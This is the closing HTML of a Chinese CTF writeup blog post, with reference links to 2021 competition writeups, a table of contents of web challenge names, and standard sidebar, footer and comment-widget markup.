+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.anquanke.com/post/id/259487">0RAYS-L3HCTF2021 writeup-web</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/10533">2021深育杯线上初赛官方WriteUp</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">MySQL写shell</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mp.weixin.qq.com/s?__biz=MzU1MTkwMTY1NQ==&mid=2247490421&idx=1&sn=1200e843e091a2b0f33d03a6a4f676e8&chksm=fb8b1bcdccfc92db6bceb0cde8b19be541fcfda33fd35bb92c4c048ae088f3f520f7a8046651&mpshare=1&scene=23&srcid=1121Bm0ZUeVoyDhZUGicjEdo&sharer_sharetime=1637468576274&sharer_shareid=4fbfc4ca172e056279ec9e2be19cf8fb#rd">西湖论剑2021中国杭州网络安全技能大赛writeup</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/DisMisPres/article/details/94733424">tar文件结构</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://harold.kim/blog/2021/11/n1ctf-writeup/">n1ctf-writeup</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://r3kapig.com/writeup/20211122-n1ctf">N1CTF 2021 Writeup</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/gopher/" rel="tag"># gopher</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8.html" rel="prev" title="栈溢出简单入门">
+      <i class="fa fa-chevron-left"></i> 栈溢出简单入门
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%5BHITCON2021%5Dweb.html" rel="next" title="[HITCON2021]web">
+      [HITCON2021]web <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8B%9F%E6%80%81-amp-L3H-amp-%E6%B7%B1%E8%82%B2-amp-%E6%B9%96%E6%B9%98-amp-%E8%A5%BF%E6%B9%96-amp-N1"><span class="nav-number">1.</span> <span class="nav-text">拟态&amp;L3H&amp;深育&amp;湖湘&amp;西湖&amp;N1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B"><span class="nav-number">1.1.</span> <span class="nav-text">拟态决赛</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%9F%E6%80%814%E8%BF%9E"><span class="nav-number">1.1.1.</span> <span class="nav-text">拟态4连</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">第一题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%A2%98"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">第二题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%A2%98"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">第三题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E9%A2%98"><span class="nav-number">1.1.1.4.</span> <span class="nav-text">第四题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#disable"><span class="nav-number">1.1.2.</span> <span class="nav-text">disable</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%90%E6%A7%BD"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">吐槽</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hbs"><span class="nav-number">1.1.3.</span> <span class="nav-text">hbs</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#L3H"><span class="nav-number">1.2.</span> <span class="nav-text">L3H</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#image-service1"><span class="nav-number">1.2.1.</span> <span class="nav-text">image service1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#image-service2"><span class="nav-number">1.2.2.</span> <span class="nav-text">image service2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#update"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">update</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RGB"><span class="nav-number">1.2.3.</span> <span class="nav-text">RGB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cover"><span class="nav-number">1.2.4.</span> <span class="nav-text">cover</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bypass"><span class="nav-number">1.2.5.</span> <span class="nav-text">bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#update-1"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">update</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%B1%E8%82%B2"><span class="nav-number">1.3.</span> <span class="nav-text">深育</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EasySQL"><span class="nav-number">1.3.1.</span> <span class="nav-text">EasySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FakeWget"><span class="nav-number">1.3.2.</span> <span class="nav-text">FakeWget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EasyWAF"><span class="nav-number">1.3.3.</span> <span class="nav-text">EasyWAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#weblog"><span class="nav-number">1.3.4.</span> <span class="nav-text">weblog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ZIPZIP"><span class="nav-number">1.3.5.</span> <span class="nav-text">ZIPZIP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B9%96%E6%B9%98"><span class="nav-number">1.4.</span> <span class="nav-text">湖湘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#willphp"><span class="nav-number">1.4.1.</span> <span class="nav-text">willphp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91"><span class="nav-number">1.5.</span> <span class="nav-text">西湖论剑</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%81%8F%E5%A6%B9%E7%9A%84web"><span class="nav-number">1.5.1.</span> <span class="nav-text">灏妹的web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EZupload"><span class="nav-number">1.5.2.</span> <span class="nav-text">EZupload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%9D%E5%A4%96%E6%B5%8B%E8%AF%95"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">额外测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OA-RCE"><span class="nav-number">1.5.3.</span> <span class="nav-text">OA?RCE?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#N1"><span class="nav-number">1.6.</span> <span class="nav-text">N1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-number">1.6.1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Funny-web"><span class="nav-number">1.6.2.</span> <span class="nav-text">Funny_web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Easyphp"><span class="nav-number">1.6.3.</span> <span class="nav-text">Easyphp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9D%91"><span class="nav-number">1.7.</span> <span class="nav-text">坑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.8.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
